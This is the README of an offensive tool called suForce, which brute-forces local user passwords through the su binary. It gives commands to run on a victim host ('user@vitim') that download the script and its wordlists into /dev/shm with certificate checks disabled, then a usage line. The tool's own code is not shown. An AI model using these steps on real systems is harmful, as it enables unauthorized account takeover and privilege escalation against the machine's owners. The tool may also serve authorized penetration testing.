# suForce

**`suForce` performs `brute force` attacks on user `passwords` by abusing the `su` binary.**

![](/screenshot.png)

- <kbd>Download suForce</kbd>

```cmd
cd /dev/shm
wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/suForce"
chmod +x suForce
```

- <kbd>Download Wordlist (Optional)</kbd>

```cmd
wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/techyou.txt"
wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/top12000.txt"
```

- <kbd>Use</kbd>

```cmd
user@vitim:~$ ./suForce -u <USER> -w <WORDLIST>
```

---
